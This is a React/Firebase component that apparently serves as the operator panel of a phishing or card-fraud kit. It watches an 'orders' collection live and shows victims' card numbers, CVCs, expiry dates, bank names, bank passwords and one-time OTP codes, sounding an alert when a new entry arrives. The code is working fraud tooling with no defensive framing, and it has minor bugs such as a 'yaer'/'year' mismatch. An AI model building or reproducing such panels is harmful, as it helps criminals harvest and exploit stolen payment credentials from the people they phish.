'use client';

import { useEffect, useRef, useState } from 'react';
import { collection, query, orderBy, onSnapshot, getDocs, DocumentData, QueryDocumentSnapshot, updateDoc, refEqual, doc } from 'firebase/firestore';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from '@/components/ui/accordion';
import { Badge } from '@/components/ui/badge';
import db from '@/app/lib/firebase';

interface Submission {
  id: string;
  cardNumber: string;
  cvc: string;
  month: string;
  yaer: string;
  otp: string;
  createdAt: string
}
async function getDataFromFirestore() {
  const arr: QueryDocumentSnapshot<DocumentData, DocumentData>[] = []
  const querySnapshot = await getDocs(collection(db, 'orders'));
  const data = querySnapshot.docs.map((doc) => arr.push(doc));
  return arr
}
export default function SubmissionsList() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [isNew, setisNew] = useState(false);

  const isInitialLoad = useRef(true);
  const uodateState=(docId:string,newState:string)=>{
  setTimeout(() => {
    const docRef = doc(db,'orders',docId)
    updateDoc(docRef,{cardState:newState})
  }, 8000);
  }
  useEffect(() => {
    const q = query(collection(db, 'orders'))
    const unsubscribe = onSnapshot(q, (querySnapshot) => {
      const submissionsData: any = [];
      querySnapshot.forEach((doc) => {
        if(doc.data().cardState === 'new' &&doc.data().cardState != undefined   ){
          uodateState(doc.id,'old')
        }
        submissionsData.push({ id: doc.id, ...doc.data() } as any)
      })
      
      setSubmissions(submissionsData)
      console.log(submissionsData)


      if (!isInitialLoad.current) {

      } else {
        isInitialLoad.current = false
      }
    })
    return () => unsubscribe()

  }, [])

  useEffect(() => {
    setisNew(true)
    playNotificationSound()
    if (isNew) {
      setTimeout(() => {
        setisNew(false)
      }, 3000);
    }
  }, [submissions.length])

  const [audio, setAudio] = useState<HTMLAudioElement>();

  const playNotificationSound = () => {
    setAudio(new Audio("/notification.wav"))
    if (audio) {
      audio!.play().catch((error) => {
        console.error("Failed to play sound:", error);
      });
    }
  };
  return (
    <div className="m-2 grid md:grid-cols-4 gap-6 ">
      {submissions.map((submission: DocumentData) => (
        <Accordion key={submission.id} type="single" collapsible>
          <Card className='bg-gray-900 text-white  '>
            <AccordionItem value="item-1">
              <CardHeader className="flex flex-row items-center  justify-between	">
                <AccordionTrigger>
                  {' '}
                  <CardTitle className='text-sm'>{submission.cardNumber}</CardTitle>
                </AccordionTrigger>
                <div>
                  <Badge className={`${submission.cardState ==='new'? 'bg-blue-500' : 'bg-red-500'} `}>{submission.cardState==='new'?'جديد':'قديم'}</Badge>{' '}

                </div>
              </CardHeader>
              <AccordionContent>
                <CardContent dir='rtl' className='grid grid-cols-1'>
                  <div className='flex justify-start'>

                    <strong className='mx-3 text-red-300  mx-4'>تاريخ الانتهاء </strong>
                    <span className="mx-4">
                      {submission.month + "/" + submission.year}          </span>
                  </div>

                  <div className='flex justify-start'>
                    <strong className='mx-3 text-red-300 mx-4'>CVC </strong>
                    <span className="mx-4"> {submission.cvc}</span>
                  </div>

                  <div className='flex justify-start'>
                    <strong className='mx-3 text-red-300 mx-4'>BANK </strong>
                    <span className="mx-4"> {submission.bank}</span>
                  </div>


                  <div className='flex justify-start'>
                    <strong className='mx-3 text-red-300 mx-4'>Pass </strong>
                    <span className="mx-4"> {submission.pass}</span>
                  </div>      <div className='flex justify-start'>
                    <strong className='mx-3 text-red-300 mx-4'>OTP</strong>
                    <span className="mx-4"> {submission.otp}</span>
                  </div>

                </CardContent>
              </AccordionContent>
            </AccordionItem>
          </Card>
        </Accordion>
      ))}
    </div>
  );
}
